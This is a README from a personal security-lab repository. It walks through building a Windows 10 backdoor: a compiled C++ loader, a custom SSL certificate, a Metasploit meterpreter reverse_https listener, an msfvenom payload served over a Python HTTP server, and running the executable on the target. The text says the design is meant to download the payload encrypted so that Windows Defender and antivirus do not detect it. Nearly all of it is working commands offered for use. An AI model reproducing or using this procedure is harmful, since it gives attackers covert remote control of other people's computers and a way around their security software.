# Cyber Security
Cyber Security Lab Experiences by Fabio Felgueiras

Use this for ethical hacking only.

In this example we will use a Kali Linux 2023.2 and Windows 10

Tools used:
   - OpenSSL To create the certificate
   - msfconsole to create the listener ( receive the comunication from the windows machine )
   - msfvenom to create the payload file
   - python to create the http server ( to deliver the payload )
   - c++ to create the windows .exe  ( the backdoor.cpp )

To code the c++ backdoor.cpp i used part of the code developed by TheD1rkMtr and customized for my objective.
https://github.com/TheD1rkMtr/Shellcode-Hide/tree/main

Used code from the Simple Code that is detected by Windows defender and Antivirus, and mized with the Fileless shell code, to download the payload using SSL so that all comes encrypted and not detected.




Windows 10 Backdoor Creation

In Kali >

1- Download

    git clone https://github.com/Blive77/cybersecurity/
    cd cybersecurity
    
2- Compile

    x86_64-w64-mingw32-g++ --static -o backDoorTest.exe backdoor.cpp -fpermissive -lws2_32
      
3- Create custom SSL/TLS certificate 
    https://docs.metasploit.com/docs/using-metasploit/advanced/meterpreter/meterpreter-paranoid-mode.html

    openssl req -new -newkey rsa:4096 -days 365 -nodes -x509 \
    -subj "/C=US/ST=Texas/L=Austin/O=Development/CN=www.example.com" \
    -keyout www.example.com.key \
    -out www.example.com.crt && \
    cat www.example.com.key  www.example.com.crt > www.example.com.pem && \
    rm -f www.example.com.key  www.example.com.crt
    
      
4- Config the msfconsole Listener

    msfconsole
    use exploit/multi/handler
    set payload windows/x64/meterpreter/reverse_https
    set LHOST 0.0.0.0
    set LPORT 3333
    set HandlerSSLCert www.example.com.pem
    set StagerVerifySSLCert true
    set HandlerSSLCert /home/kali/cybersecurity/www.example.com.pem
    exploit
   
    
5- Create the Payload with msfvenom in Kali linux

   In my case:
   - Host IP= 192.168.235.132  
   - Host Port= 3333
   - Path To cert file= /home/kali/cybersecurity/www.example.com.pem
      
    msfvenom -p windows/x64/meterpreter/reverse_https lhost=(Host IP) lport=(Host Port) HandlerSSLCert=(Path To cert file) StagerVerifySSLCert=true -f raw > load.bin
    
   
6- Setup the http webserver for Payload deliver (important to do this in the same folder the payload was created)

    python -m http.server
    
In Windows >
    
1- Execute the File created in point (2) "backDoorTest.exe"
    
    backDoorTest.exe ( can be execute with paramters IP, Port and PayLoad File ) 
 
